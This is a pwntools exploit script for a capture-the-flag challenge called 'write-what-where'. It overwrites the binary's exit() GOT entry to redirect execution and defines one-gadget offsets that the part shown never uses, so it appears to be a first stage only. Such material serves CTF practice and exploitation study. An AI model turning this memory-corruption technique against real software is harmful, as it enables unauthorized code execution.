#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('write-what-where')
if not args.remote:
    libc = exe.libc
else: 
    libc = ELF('libc.so.6')

host = 'pwn-2021.duc.tf'
port = 31920

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x401246
b *0x40122f
b *0x40122a
continue
'''.format(**locals())

# -- Exploit goes here --

one_gdgt1 = 0xde78c
one_gdgt2 = 0xde78f
one_gdgt3 = 0xde792

p = start()

if args.LOCAL:
    log.info(f"pid: {p.pid}")

p.recvuntil(b"what?")
p.sendline(p32(0x4011ec))
p.recvuntil(b"where?")
p.send(str(exe.got['exit']))

p.interactive()

